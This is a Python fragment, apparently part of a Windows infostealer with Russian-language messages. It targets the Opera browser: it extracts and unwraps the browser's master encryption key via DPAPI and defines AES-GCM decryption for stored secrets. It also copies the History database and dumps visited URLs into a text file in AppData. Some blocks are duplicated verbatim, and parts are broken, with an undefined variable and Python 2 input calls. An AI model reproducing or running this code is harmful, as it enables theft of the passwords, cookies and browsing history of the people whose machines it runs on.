################################################################################
#                                 OPERA                                        #
################################################################################

try:
    def get_opera_datetime(chromedate):

        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def get_encryption_key_opera():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

 
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_data_opera(data, key):
        try:

            iv = data[3:15]
            data = data[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:

                return ""

except:
    print('Нету Opera')




try:
    def get_opera_datetime(chromedate):

        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def get_encryption_key_opera():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

 
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_data_opera(data, key):
        try:

            iv = data[3:15]
            data = data[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:

                return ""
except:
    print('Нету Opera')

################################################################################
#                                 OPERA                                        #
################################################################################
try:
    def parse_opera(url):
        try:
            parsed_url_components = url.split('//')
            sublevel_split = parsed_url_components[1].split('/', 1)
            domain = sublevel_split[0].replace("www.", "")
            return domain
        except IndexError:
            print ("URL format error!")

    def analyze_opera(results):

        prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

        if prompt == "c":
            for site, count in sites_count_sorted.items():
                print (site, count)
        elif prompt == "p":
            plt.bar(range(len(results)), results.values(), align='edge')
            plt.xticks(rotation=45)
            plt.xticks(range(len(results)), results.keys())
            plt.show()
        else:
            print ("[.] Uh?")
            quit()

    def pass_opera():
        try:
            data_path_opera = os.path.expanduser('~')+r"\AppData\Roaming\Opera Software\Opera Stable"
            files = os.listdir(data_path_opera)

            history_db_opera = os.path.join(data_path_opera, 'History')


            shutil.copy2(history_db_opera, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
            c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
            cursor = c.cursor()
            select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
            cursor.execute(select_statement)

            r = cursor.fetchall()
            datas = '\n'.join([str(item) for item in r])
            file = open(os.getenv("APPDATA") + '\\historyOPERA.txt', "w+") 
            file.write(datas)
        except:
            print('Нету Opera')
except:
    pass

pass_opera()



try:
    def parse_opera(url):
        try:
            parsed_url_components = url.split('//')
            sublevel_split = parsed_url_components[1].split('/', 1)
            domain = sublevel_split[0].replace("www.", "")
            return domain
        except IndexError:
            print ("URL format error!")

    def analyze_opera(results):

        prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

        if prompt == "c":
            for site, count in sites_count_sorted.items():
                print (site, count)
        elif prompt == "p":
            plt.bar(range(len(results)), results.values(), align='edge')
            plt.xticks(rotation=45)
            plt.xticks(range(len(results)), results.keys())
            plt.show()
        else:
            print ("[.] Uh?")
            quit()

    def pass_opera2():
        try:
            data_path_opera = os.path.expanduser('~')+r"\AppData\Roaming\Opera Software\Opera Stable"
            files = os.listdir(data_path_opera)

            history_db_opera = os.path.join(data_path_opera, 'History')


            shutil.copy2(history_db_opera, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
            c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
            cursor = c.cursor()
            select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
            cursor.execute(select_statement)

            r = cursor.fetchall()
            datas = '\n'.join([str(item) for item in r])
            file = open(os.getenv("APPDATA") + '\\historyOPERA.txt', "w+") 
            file.write(datas)
        except:
            print('Нету Opera')
except:
    pass

pass_opera2()